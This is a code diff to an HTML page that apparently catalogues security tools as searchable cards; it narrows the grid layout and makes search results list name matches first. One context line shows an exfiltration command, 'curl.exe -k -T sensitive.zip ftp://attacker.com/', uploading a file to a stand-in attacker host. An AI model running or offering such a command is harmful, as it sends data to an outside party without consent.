@@ -30,7 +30,7 @@
     .cs-count { font-family:var(--font-mono); font-size:.78rem; color:var(--text-muted); margin-left:auto; white-space:nowrap; }
 
     /* ── Grid ── */
-    .cs-grid { max-width:1300px; margin:0 auto; padding:2rem; display:grid; grid-template-columns:repeat(auto-fill,minmax(360px,1fr)); gap:1.25rem; }
+    .cs-grid { max-width:900px; margin:0 auto; padding:2rem; display:grid; grid-template-columns:1fr; gap:1.25rem; }
 
     /* ── Tool card ── */
     .tool-card { background:var(--bg-card); border:1px solid var(--border); border-radius:var(--radius-lg); overflow:hidden; transition:border-color .2s, transform .2s; display:flex; flex-direction:column; }
@@ -1949,15 +1949,25 @@ curl.exe -k -T sensitive.zip ftp://attacker.com/</div>
     function update() {
       const q = search.value.toLowerCase().trim();
       let visible = 0;
+      const matches = [], rest = [];
       cards.forEach(card => {
         const catMatch = activeCat === 'all' || card.dataset.cat === activeCat;
         const name = card.querySelector('.tool-card__name').textContent.toLowerCase();
         const tags = (card.dataset.tags || '').toLowerCase();
         const body = card.textContent.toLowerCase();
-        const qMatch = !q || name.includes(q) || tags.includes(q) || body.includes(q);
-        if (catMatch && qMatch) { card.classList.remove('hidden'); visible++; }
-        else card.classList.add('hidden');
+        const nameMatch = q && name.includes(q);
+        const qMatch = !q || nameMatch || tags.includes(q) || body.includes(q);
+        if (catMatch && qMatch) {
+          card.classList.remove('hidden');
+          visible++;
+          if (nameMatch) matches.push(card); else rest.push(card);
+        } else {
+          card.classList.add('hidden');
+          rest.push(card);
+        }
       });
+      // Reorder: name matches first, then rest
+      [...matches, ...rest].forEach(card => grid.appendChild(card));
       count.textContent = visible + ' tools';
       empty.classList.toggle('show', visible === 0);
     }
